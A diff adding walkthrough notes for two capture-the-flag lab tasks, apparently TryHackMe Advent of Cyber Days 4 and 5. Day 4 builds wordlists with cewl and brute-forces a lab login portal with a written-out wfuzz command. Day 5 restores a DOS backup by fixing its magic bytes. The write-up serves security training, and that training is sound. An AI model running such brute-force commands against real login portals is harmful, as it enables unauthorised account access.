@@ -80,32 +80,96 @@ Answer:
 
 ## Day 4: Baby, it's CeWLd outside
 
+check the webpage
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e6794c64-bd0d-4dc2-b29c-560ab0f1d4c7)
 
+use the homepage to generate a wordlist that could potentially hold the key to the portal
 
+```
+cewl -d 2 -m 5 -w passwords.txt http://10.10.84.220 --with-numbers
+```
 
+use the Team Members page to generate a wordlist that could potentially contain the usernames of the employees
 
+```
+cewl -d 0 -m 5 -w usernames.txt http://10.10.84.220/team.php --lowercase
+```
 
+bruteforce the login portal using wfuzz
 
+```
+wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.84.220/login.php -d "username=FUZZ&password=FUZ2Z"
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c94d347f-4630-4812-9f0c-96510ba00dea)
 
+log in to the portal using that credential
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/38b4ddc3-a587-4a85-83f0-b6d4272b948b)
 
+Answer:
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ed53c118-900c-4232-8bce-d5a34359bebc)
 
+## Day 5: A Christmas DOScovery: Tapes of Yule-tide Past
 
+start the machine, open the DosBox-X on the Desktop
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/53e63402-c9ee-4e22-b105-4bd30e37112e)
 
+list the directory
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5d69a474-53ec-4114-b553-70e09efa57e7)
 
+navigate to backup tools folder to inspect the backup file
 
+```
+cd C:\TOOLS\BACKUP
+BUMASTER.EXE C:\AC2023.BAK
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/eead6f3f-10cb-4afd-a3c1-174659f50d06)
 
+check the troubleshoot at readme.txt
 
+```
+edit README.TXT
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4f6939fd-745f-4c89-bbcb-59e6bee919c1)
 
+Alt+F and navigate to Exit to exit the editor
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5380b283-d24f-4641-960d-227a1a38356a)
 
+edit the magic byte on the backup file
+
+```
+edit C:\AC2023.BAK
+```
+
+according previous troubleshoot, the magic bytes must be 41 43. these are hexadecimal values, so we need to convert them to ASCII first
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/cdd8f019-9373-4bb3-86c7-10d10a28db18)
+
+change first 2 magic bytes to `AC` and Alt+F to Save the file
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/47518a90-2ed9-42ba-90e4-a019a4e8569a)
+
+restore the backup again
+
+```
+BUMASTER.EXE C:\AC2023.BAK
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4affd6b0-02e6-4451-a988-8a636168f5c5)
+
+Answer:
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0a9e1f14-0964-40d9-a67f-bd1ed643a751)
+
+## Day 6: Memories of Christmas Past
 
 
 
